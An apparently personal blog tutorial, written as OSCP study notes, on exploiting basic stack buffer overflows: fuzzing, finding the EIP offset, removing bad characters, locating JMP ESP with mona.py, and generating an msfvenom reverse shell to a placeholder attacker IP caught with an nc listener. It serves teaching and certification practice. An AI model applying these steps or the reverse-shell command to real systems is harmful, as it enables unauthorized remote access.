---
title:  "Basic Buffer Overflows"
header: "Basic Buffer Overflows"
categories: 
  - Tutorial
tags:
  - Hacking
---

A lot can be said about buffer overflows and they are perhaps the most daunting part of attempting the OSCP for most. However, as you&#39;ll find in most of your offensive hacking endeavors, it&#39;s all about experimentation and tweaking your process. Below are the notes I used to successfully exploit several applications (given they didn&#39;t have standard security such as ASLR or DEP) and serves as a good example of understanding a basic buffer overflow.

**Fuzz the application**

If you don&#39;t have access to the code and there aren&#39;t any publicly disclosed exploits then another viable option is to fuzz the application and see what happens. Fuzzing is essentially the act of sending malformed or unintended data to an application and watching to see if it behaves abnormally such as crashing. Keep in mind that just because you cause an application to crash doesn&#39;t necessarily mean that it&#39;s vulnerable but it should key you into paying closer attention to it.

- Run the application
- Attach the debugger ([Immunity Debugger](https://www.immunityinc.com/products/debugger/) is a good option) to the application
- Run your fuzzer
- Write a script to replicate the crash (this is where you&#39;ll set the size of the buffer)

**Find out which part of the buffer overwrites EIP**

So you'll need to know a few key pieces of controlling EIP

The EIP (Extended Instruction Pointer) register controls the execution flow of the application. Think of it as a steering wheel of a car, you can direct it where to go.

The ESP (Extended Stack Pointer) is an indirect memory operand pointing to the top of the stack. This is the point where the instructions that use the stack, actually use it.

Here are a view of these values in Immunity
![EIP & ESP Example](/asssets/images/eip_esp_example.jpg)

There are two basic tactics when attempting at controlling the EIP
Binary Tree Analysis (manual way) - essentially you split the buffer in a series of same characterws until you notice the EIP getting over-written
Example: AAAAAAAAAABBBBBBBBBBCCCCCCCCCCCCCDDDDDDDDDD

Unique String (automated way) - send a unique string so you can see which 4 bytes are written in the EIP.
Example: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4

Naturally you are going to want to use the Unique String Method whenever possible as it can cut down on discovery time and possibly lead to fewer mistakes.

- Create a unique string that's the size of your buffer (pattern\_create.rb is great for this, comes with Kali!)
  - Usage: `pattern\_create.rb 2200` <-- size of your buffer
- Place the output inside your script
- Run script and locate EIP's bytes
![EIP](/asssets/images/eip.jpg)
- Use pattern\_offset.rb to find the position from your pattern\_create script
  - Usage: `pattern-offset.rb 13731415` <--EIP value from crash
- It should return your location (something like 1403). This means that on the 1404th byte is where you can direct EIP. A good way to test this is to send a certain amount of A&#39;s, B&#39;s, and C&#39;s to see where the values are located
  - Example: buffer = &quot;A&quot;\*1403 + &quot;B&quot;\*4 + &quot;C&quot;\*793 &lt;----the last part is to fulfill the orginial 2200 buffer

**(Optional) Increase the buffer size to allow room for shellcode**

The average size for shellcode is around 350-400 so you&#39;ll need to have roughly that much space left in the buffer. If you don&#39;t have enough then it&#39;s a good idea to increase the padding on your buffer either before or after the EIP director bytes.

**Discover bad characters**

To me this can be the most frustrating part of the process and often where people slip up. It&#39;s not so much that it&#39;s difficult but rather just tedious and attention to detail can go a long way. The purpose in discovering bad characters is to ensure that our shellcode doesn&#39;t get modified (truncated, character replaced, terminated). Null values and carriage returns are notoriously bad characters.

- Place the below character listing in your fuzzer
- Run the fuzzer
- Look at memory location of ESP
- Discover where the increments are broken and/or malformed
- Remove the character from the buffer and continue until you&#39;ve completed them all

**Redirect EIP**

When the application starts each time you&#39;ll notice that your pointers are at different locations. To ensure that we always hit our shellcode, we&#39;ll need a solid/static location with each restart. There are a couple of requirements in this instance (this is just a basic example). Needs to be readable and executable and can&#39;t have DEP or ASLR enabled. A good place to look is any accompanying DLL&#39;s with the application. A good tool to help discover potential modules is mona.py, which once again comes with Kali.

- Once you&#39;ve found a solid module, you&#39;ll want to search for JMP ESP&#39;s within immunity
  - Search &gt; Sequence of Commands &gt; &quot;push esp (next line) retn&quot;
  - Search for jmp esp in the whole DLL
  - If you can&#39;t find one then the nasm\_shell command is FFE4 and you should search for that using mona.py
    - Usage: `!mona find –s "\xff\xe4" –m <vulnerable module>`  
  - Test and place the location within your fuzzer

**Generate Shellcode**

Your shell code can be just about anything malicious that you want to do on the asset, but its typically used for returning a shell (but don&#39;t forget about other options like adding users, altering data, etc.,.). A basic tool to help with generating shellcode is msfvenom which is part of the Metasploit framework.

- In our example we&#39;re going to use a reverse shell and encode it with shikata\_ga\_nai (I highly recommend to explore some of the other encoders as they may be the only options with your bad characters combination)
  - Usage:  `msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<PORT NUMBER> EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "<BAD CHARACTERS>`  
- Make note of the size of your shellcode as you&#39;ll need to account for it and ensure that you have the proper space
- Within your fuzzer, place a few NOP&#39;s (\x90) before the shellcode to ensure it has enough room to decode and it won&#39;t trip over itself

**Exploit**

You&#39;re ready to fire off your exploit! I recommend setting a breakpoint at the JMP ESP address to verify if the shellcode gets executed

- Set up a listener on the port number that you chose
  - Usage: `nc –lvp <PORT NUMBER>`  
- Fire off your script and if everything works right you should be presented with a reverse shell from your target
